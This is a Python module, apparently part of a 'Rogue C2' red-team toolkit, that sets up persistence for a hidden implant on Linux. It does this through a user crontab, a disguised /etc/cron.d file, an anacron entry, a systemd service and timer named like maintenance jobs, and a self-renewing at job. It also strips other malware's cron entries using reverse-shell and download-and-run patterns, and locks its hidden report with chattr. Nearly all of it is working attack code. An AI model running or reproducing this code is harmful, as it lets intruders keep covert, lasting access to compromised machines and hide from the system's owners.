#!/usr/bin/env python3
"""
PAYLOAD: Advanced Cron Persistence
DESCRIPTION: Multiple cron persistence methods with evasion
AUTHOR: Rogue Red Team
VERSION: 2.0
"""
import os, subprocess, random, time, hashlib, re, json
from datetime import datetime

class AdvancedCronPersistence:
    def __init__(self, hidden_dir=None):
        self.hidden_dir = hidden_dir or os.path.expanduser("~/.cache/.rogue")
        self.implant_path = os.path.join(self.hidden_dir, ".rogue_agent.py")
        self.persistence_methods = []
        
    def setup_standard_cron(self):
        """Standard cron job persistence"""
        try:
            # Random interval between 3-10 minutes
            minute = random.randint(0, 59)
            interval = random.choice([3, 5, 7, 10])
            
            cron_command = f"{minute} */{interval} * * * python3 {self.implant_path} 2>/dev/null"
            
            # Add to user's crontab
            subprocess.call(f'(crontab -l 2>/dev/null; echo "{cron_command}") | crontab -', shell=True)
            
            self.persistence_methods.append({
                'type': 'standard_cron',
                'command': cron_command,
                'timestamp': datetime.now().isoformat()
            })
            
            return "[+] Standard cron persistence established"
            
        except Exception as e:
            return f"[!] Standard cron failed: {e}"
    
    def setup_system_cron(self):
        """System-wide cron persistence (requires root)"""
        try:
            if os.geteuid() != 0:
                return "[*] Skipping system cron (requires root)"
            
            # Create system cron file
            cron_file = "/etc/cron.d/.system_maintenance"
            cron_command = f"*/5 * * * * root python3 {self.implant_path} 2>/dev/null\n"
            
            with open(cron_file, 'w') as f:
                f.write("# System maintenance job\n")
                f.write(cron_command)
            
            # Make it look legitimate
            os.chmod(cron_file, 0o644)
            
            self.persistence_methods.append({
                'type': 'system_cron',
                'file': cron_file,
                'timestamp': datetime.now().isoformat()
            })
            
            return "[+] System cron persistence established"
            
        except Exception as e:
            return f"[!] System cron failed: {e}"
    
    def setup_anacron(self):
        """Anacron persistence for systems with irregular uptime"""
        try:
            if not os.path.exists("/etc/anacrontab"):
                return "[*] Skipping anacron (not available)"
            
            # Backup original
            subprocess.call("cp /etc/anacrontab /etc/anacrontab.backup 2>/dev/null", shell=True)
            
            anacron_entry = f"""
# System maintenance
1       5       system.maintenance   python3 {self.implant_path} 2>/dev/null
"""
            
            with open("/etc/anacrontab", 'a') as f:
                f.write(anacron_entry)
            
            self.persistence_methods.append({
                'type': 'anacron',
                'timestamp': datetime.now().isoformat()
            })
            
            return "[+] Anacron persistence established"
            
        except Exception as e:
            return f"[!] Anacron failed: {e}"
    
    def setup_systemd_timer(self):
        """Systemd timer persistence (modern Linux)"""
        try:
            if os.geteuid() != 0:
                return "[*] Skipping systemd timer (requires root)"
            
            service_content = f"""[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.implant_path}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
            
            timer_content = f"""[Unit]
Description=Run System Maintenance periodically

[Timer]
OnBootSec=5min
OnUnitActiveSec=10min
RandomizedDelaySec=30s

[Install]
WantedBy=timers.target
"""
            
            # Write service file
            service_file = "/etc/systemd/system/system-maintenance.service"
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Write timer file
            timer_file = "/etc/systemd/system/system-maintenance.timer"
            with open(timer_file, 'w') as f:
                f.write(timer_content)
            
            # Enable and start
            subprocess.call("systemctl daemon-reload", shell=True)
            subprocess.call("systemctl enable --now system-maintenance.timer", shell=True)
            
            self.persistence_methods.append({
                'type': 'systemd_timer',
                'service_file': service_file,
                'timer_file': timer_file,
                'timestamp': datetime.now().isoformat()
            })
            
            return "[+] Systemd timer persistence established"
            
        except Exception as e:
            return f"[!] Systemd timer failed: {e}"
    
    def setup_at_job(self):
        """One-time 'at' job that recreates itself"""
        try:
            # Create script that recreates the at job
            recreator_script = os.path.join(self.hidden_dir, ".recreate_at.sh")
            script_content = f"""#!/bin/bash
# Recreate at job
echo "python3 {self.implant_path} 2>/dev/null" | at now + 1 hour 2>/dev/null
"""
            
            with open(recreator_script, 'w') as f:
                f.write(script_content)
            
            os.chmod(recreator_script, 0o755)
            
            # Schedule the job
            at_command = f"bash {recreator_script}"
            subprocess.call(f'echo "{at_command}" | at now + 1 hour 2>/dev/null', shell=True)
            
            self.persistence_methods.append({
                'type': 'at_job',
                'script': recreator_script,
                'timestamp': datetime.now().isoformat()
            })
            
            return "[+] AT job persistence established"
            
        except Exception as e:
            return f"[!] AT job failed: {e}"
    
    def clean_competing_crons(self):
        """Remove suspicious cron entries from other malware"""
        try:
            # Get current crontab
            output = subprocess.check_output("crontab -l 2>/dev/null || echo ''", shell=True).decode()
            
            suspicious_patterns = [
                r'curl.*bash',
                r'wget.*bash',
                r'/tmp/.*\.sh',
                r'/dev/shm/.*',
                r'base64.*decode',
                r'python.*http',
                r'perl.*socket',
                r'php.*shell',
                r'nc.*-e.*bash',
                r'socat.*exec'
            ]
            
            cleaned = []
            lines = output.split('\n')
            new_lines = []
            
            for line in lines:
                line_lower = line.lower()
                suspicious = False
                
                for pattern in suspicious_patterns:
                    if re.search(pattern, line_lower):
                        suspicious = True
                        cleaned.append(line)
                        break
                
                if not suspicious and line.strip():
                    new_lines.append(line)
            
            # Write cleaned crontab
            if cleaned:
                subprocess.call('echo "" | crontab -', shell=True)  # Clear
                if new_lines:
                    crontab_content = '\n'.join(new_lines)
                    subprocess.call(f'echo "{crontab_content}" | crontab -', shell=True)
                
                self.persistence_methods.append({
                    'type': 'cleaned_crons',
                    'removed': cleaned,
                    'timestamp': datetime.now().isoformat()
                })
                
                return f"[+] Cleaned {len(cleaned)} suspicious cron entries"
            
            return "[*] No suspicious cron entries found"
            
        except Exception as e:
            return f"[!] Cron cleaning failed: {e}"
    
    def execute(self):
        """Execute all persistence methods"""
        try:
            print("[+] Setting up advanced cron persistence...")
            
            results = []
            results.append(self.clean_competing_crons())
            results.append(self.setup_standard_cron())
            results.append(self.setup_system_cron())
            results.append(self.setup_anacron())
            results.append(self.setup_systemd_timer())
            results.append(self.setup_at_job())
            
            # Save persistence report
            report_file = os.path.join(self.hidden_dir, ".persistence_report.json")
            with open(report_file, 'w') as f:
                json.dump({
                    'methods': self.persistence_methods,
                    'timestamp': datetime.now().isoformat(),
                    'total_methods': len(self.persistence_methods)
                }, f, indent=2)
            
            # Hide the report
            subprocess.call(f'chattr +i "{report_file}" 2>/dev/null', shell=True)
            
            return "\n".join(results)
            
        except Exception as e:
            return f"[!] Advanced cron persistence failed: {e}"

# === Integration with Rogue C2 ===
def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    persister = AdvancedCronPersistence()
    return persister.execute()

if __name__ == "__main__":
    print(rogue_integration())
